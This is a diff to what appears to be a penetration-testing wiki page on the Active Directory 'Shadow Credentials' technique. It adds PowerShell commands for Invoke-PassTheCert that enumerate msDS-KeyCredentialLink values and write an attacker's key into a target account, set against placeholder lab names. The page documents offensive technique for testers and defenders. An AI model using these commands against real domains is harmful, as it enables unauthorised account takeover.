@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo, WoBuGs, mpgn, p0dalirius, sckdev
+authors: ShutdownRepo, WoBuGs, mpgn, p0dalirius, sckdev, jamarir
 category: ad
 ---
 
@@ -61,6 +61,23 @@ From Windows systems, the `msDs-KeyCredentialLink` attribute of a target user or
 
 ```powershell
 Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
+```
+
+It can also be done with the [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) tool.
+
+> Note: the README contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash), and provide numerous actions (e.g. raw LDAP queries, Shadow Credentials enumeration & exploitation, DnsRecords enumeration, etc.)
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+# List the keys of a principal (not specifying -Object switch would list all targets with an msDs-KeyCredentialLink attribute)
+Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'ShadowCreds' -Object 'CN=John JD. DOE,CN=Users,DC=ADLAB,DC=LOCAL'
+# Populates the targeted account's 'msDS-KeyCredentialLink' attribute with a new self-signed certificate.
+Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'ShadowCreds' -Target 'CN=John JD. DOE,CN=Users,DC=ADLAB,DC=LOCAL'
 ```
 
 When the public key has been set in the `msDs-KeyCredentialLink` of the target, the certificate generated can be used with [Pass-the-Certificate](pass-the-certificate.md) to obtain a TGT and further access.
